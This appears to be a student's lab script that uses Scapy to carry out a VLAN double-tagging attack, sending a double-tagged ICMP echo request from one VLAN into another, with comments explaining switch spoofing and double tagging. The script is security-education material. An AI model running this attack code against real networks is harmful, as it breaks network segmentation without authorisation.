"""
VLAN Hopping - when an attacker escapes their assigned VLAN and sends traffic into another VLAN
1. Switch spoofing - attacker tricks a switch port into becoming a trunk port;
Trunk ports carry traffic for multiple VLANs; normally used between switches, not for ordinary hosts
2. Double tagging - attacker sends a frame with two VLAN tags, using an outer tag that matches the trunk's "Native VLAN";
the first switch strips the outer tag and forwards the frame, whereas the second one delivers it to the target VLAN specified in the inner tag.

According to the Brightspace announcement: The ICMP echo request is the only proof needed that the cross-VLAN attack was successful.
The ARP requests (present in the .pdf) are only host02's lookups for its gateway's MAC, which is not configured in the lab setup.
"""
import sys
from scapy.all import *

INTERFACE = "eth0"

def get_mac(ip: str) -> str:
    """Resolve MAC address of IP via ARP broadcast."""
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, iface=INTERFACE, verbose=False,
    )
    for _, reply in answered:
        return reply[Ether].src
    raise RuntimeError(f"No MAC address found for {ip}")


def main():
    if len(sys.argv) != 4:
        print(f"Usage: double_tag.py <attacker_vlan> <target_vlan> <target_ip>")
        sys.exit(1)

    attacker_vlan = int(sys.argv[1])
    target_vlan = int(sys.argv[2])
    target_ip = sys.argv[3]

    # get own MAC address
    attacker_mac = get_if_hwaddr(INTERFACE)
    print(f"[INFO] Attacker MAC: {attacker_mac}")

    try:
        target_mac = get_mac(target_ip)
        print(f"[INFO] Target MAC: {target_mac}")
    except RuntimeError:
        # broadcast MAC, will work in this lab because there is only 1 host in VLAN 20
        # otherwise everyone would be flooded
        # this is actually the intended behaviour because there is no routing between VLANs, and get_mac()
        # never reaches beyond the caller's VLAN (stays trapped in attacker's VLAN1)
        target_mac = "ff:ff:ff:ff:ff:ff"
        print(f"[INFO] Could not resolve target MAC, using broadcast: {target_mac}")

    # we stack the layers using "/"
    # ICMP - payload, an echo request (type=8), sequence 0
    # IP - wraps ICMP, contains source IP (attacker - hardcoded/defined in docker-compose.yml) and destination IP (victim)
    # Dot1Q(vlan=target_vlan) the inner vlan (20), survives the first switch
    # Dot1Q(vlan=attacker_vlan) the outer native vlan (1), tells the first switch this is normal traffic
    # Ether L2 (Data link layer) frame wrapper, source is the attacker's MAC, destination is the victim's MAC
    pkt = (
        Ether(src=attacker_mac, dst=target_mac) /
        Dot1Q(vlan=attacker_vlan) /
        Dot1Q(vlan=target_vlan) /
        IP(src=f"192.168.120.100", dst=target_ip) /
        ICMP(type=8, code=0, id=0, seq=0)
    )

    print(f"[INFO] Sending double-tagged ICMP echo request:")
    print(f"    Outer VLAN: {attacker_vlan}")
    print(f"    Inner VLAN: {target_vlan}")
    print(f"    Destination IP: {target_ip}")

    sendp(pkt, iface=INTERFACE, verbose=False)
    print(f"[INFO] Packet sent!")

if __name__ == "__main__":
    main()
